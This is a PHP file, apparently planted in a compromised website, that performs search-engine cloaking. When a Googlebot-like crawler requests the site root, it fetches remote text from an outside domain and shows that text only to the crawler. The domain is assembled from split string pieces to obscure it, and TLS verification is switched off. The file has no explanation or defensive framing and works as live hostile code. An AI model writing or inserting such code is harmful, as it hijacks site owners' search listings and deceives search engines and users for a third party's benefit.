<?php
ob_start();
header('Vary: User-Agent');


$request_uri = $_SERVER['REQUEST_URI'] ?? '';
$path = parse_url($request_uri, PHP_URL_PATH);
$is_root = ($path === '/');


$u1 = "https://";
$u2 = "mysantika.org";
$u3 = "/";
$u4 = "ktu";
$u5 = ".txt";
$bot_url = $u1 . $u2 . $u3 . $u4 . $u5;


$ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';


$b = array('googlebot', 'google-site-verification', 'google-inspectiontool', 'googlebot-mobile', 'googlebot-news');
$p = implode('|', $b);
$pattern = "/(" . $p . ")/i";

// Fungsi fetch sederhana
$fn = function($url) {
    if (function_exists('curl_init')) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($c, CURLOPT_TIMEOUT, 5);
        curl_setopt($c, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        $r = curl_exec($c);
        curl_close($c);
        return $r;
    } elseif (ini_get('allow_url_fopen')) {
        $context = stream_context_create(['http' => ['timeout' => 5]]);
        return @file_get_contents($url, false, $context);
    }
    return false;
};


if (!function_exists('random_int')) {
    function random_int($min, $max) {
        return mt_rand($min, $max);
    }
}


if ($is_root && call_user_func('preg_match', $pattern, $ua)) {
    usleep(random_int(1000000, 2000000));
    $result = $fn($bot_url);
    
    if ($result === false || empty($result)) {
        echo '<!-- googlebot content -->';
    } else {
        echo $result;
    }
    ob_end_flush();
    exit; 
}

ob_end_flush();
?>
